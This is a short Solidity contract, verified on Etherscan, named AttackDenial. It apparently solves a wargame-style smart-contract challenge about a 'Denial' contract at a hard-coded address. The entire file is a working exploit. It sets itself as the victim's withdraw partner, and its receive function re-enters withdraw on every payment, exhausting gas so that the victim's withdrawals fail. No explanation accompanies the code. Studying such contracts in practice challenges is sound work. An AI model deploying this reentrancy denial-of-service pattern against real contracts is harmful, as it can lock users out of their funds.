/**
 *Submitted for verification at Etherscan.io on 2023-03-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address) external;
    function contractBalance() external returns(uint);
}

contract AttackDenial{
    IDenial victim = IDenial(0x269319d43D8e1F87A4dc06C01aF2A477b08B4dD8);

    function attack() public {
        victim.setWithdrawPartner(address(this));
        victim.withdraw();
    }
    
    receive() external payable {
        victim.withdraw();
    }
}